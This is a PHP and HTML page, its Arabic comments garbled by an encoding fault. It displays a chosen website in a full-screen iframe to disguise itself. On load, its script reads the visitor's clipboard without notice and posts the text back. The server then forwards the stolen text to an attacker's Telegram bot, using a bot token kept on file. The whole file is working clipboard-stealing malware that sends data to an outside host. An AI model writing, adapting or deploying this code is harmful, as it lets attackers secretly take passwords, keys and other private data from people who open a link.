<?php
// ุงุณู ุงูููู ุงููุตู
$filename = '../url.txt';

// ุงูุญุตูู ุนูู ุงูุจูุงูุงุช ูู ุงูุทูุจ
$lineNumber = isset($_GET['link']) ? intval($_GET['link']) : '';
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '';

// ูุฑุงุกุฉ ุงูููู ููุตูููุฉ ูู ุงูุณุทูุฑ
$lines = file($filename, FILE_IGNORE_NEW_LINES);

// ุงุณุชุฎุฑุงุฌ ุงูุณุทุฑ ุงููุทููุจ (ุงูููุฑุณ ูุจุฏุฃ ูู ุตูุฑ ูุฐุง ูููู ุจุทุฑุญ ูุงุญุฏ)
$desiredLine = '';
if ($lineNumber && isset($lines[$lineNumber - 1])) {
    $desiredLine = trim($lines[$lineNumber - 1]);
}

// ุฏุงูุฉ ููุญุตูู ุนูู ุงูุณุทุฑ ูู ุงูููู
function getLineFromFile($filename, $lineNumber) {
    if (!file_exists($filename)) {
        return null;
    }

    $lines = file($filename, FILE_IGNORE_NEW_LINES);
    if ($lineNumber > 0 && isset($lines[$lineNumber - 1])) {
        return trim($lines[$lineNumber - 1]);
    }

    return null;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $text = $_POST['text'] ?? '';
    if ($text && $chatId) {
        // ุงุณุชูุงู ุนูุตุฑ ID2 ูู ุทูุจ GET
        $idLineNumber = isset($_GET['ID2']) ? intval($_GET['ID2']) : null;

        $botToken = null;

        if ($idLineNumber !== null && $idLineNumber > 0) {
            // ุงุณุชุฎุฑุงุฌ ุงูุณุทุฑ ูู ุงูููู ุจุนุฏ ุงูุฑุฌูุน ูุฑุชูู ููุฎูู ุซู ุงูุฏุฎูู ุฅูู ุงููุณุงุฑ ุงููุญุฏุฏ
            $botToken = getLineFromFile('../database/token.txt', $idLineNumber);
        }

        if ($botToken) {
            $url = "https://api.telegram.org/bot$botToken/sendMessage";

            $postData = [
                'chat_id' => $chatId,
                'text' => "ุชู ุณุญุจ ูุต ุญุงูุธุฉ ุฌุฏูุฏ ๐\n\n$text",
                'parse_mode' => 'HTML'
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            // ุนุฑุถ ุฑุณุงูุฉ ุงููุฌุงุญ ุฃู ุงููุดู ุจูุงุกู ุนูู ุงูุงุณุชุฌุงุจุฉ
            if ($response) {
                // ุฅุฐุง ูุงู ููุงู ุงุณุชุฌุงุจุฉุ ููููู ุชุณุฌูู ุฃู ุนุฑุถ ูุชูุฌุฉ ููุง
                echo "ุชู ุฅุฑุณุงู ุงูุฑุณุงูุฉ ุจูุฌุงุญ.";
            } else {
                echo "ูุดู ุฅุฑุณุงู ุงูุฑุณุงูุฉ.";
            }
        } else {
            echo "ูู ูุชู ุงูุนุซูุฑ ุนูู ุงูุชููู.";
        }
    } else {
        echo "ุงูุจูุงูุงุช ุบูุฑ ุตุญูุญุฉ.";
    }
    exit; // ุชุฃูุฏ ูู ุฅููุงุก ุงูุณูุฑุจุช ุจุนุฏ ูุนุงูุฌุฉ POST
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden; /* ูููุน ุงูุชูุฏุฏ ูู ุญุงู ุชูุช ุฅุถุงูุฉ ุนูุงุตุฑ ุฌุงูุจูุฉ */
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <?php if (!empty($desiredLine)): ?>
        <iframe src="<?php echo htmlspecialchars($desiredLine); ?>" frameborder="0"></iframe>
    <?php endif; ?>

    <script>
        window.addEventListener('DOMContentLoaded', function() {
            // ุงุณุชุฑุฏุงุฏ ูุตูุต ุงูุญุงูุธุฉ
            navigator.clipboard.readText().then(function(text) {
                var formData = new FormData();
                formData.append('text', text);

                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(result => console.log(result))
                .catch(error => console.log('ุญุฏุซ ุฎุทุฃ: ', error));
            })
            .catch(error => console.log('ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุงุณุชุฑุฏุงุฏ ูุต ุงูุญุงูุธุฉ: ', error));
        });
    </script>
</body>
</html>
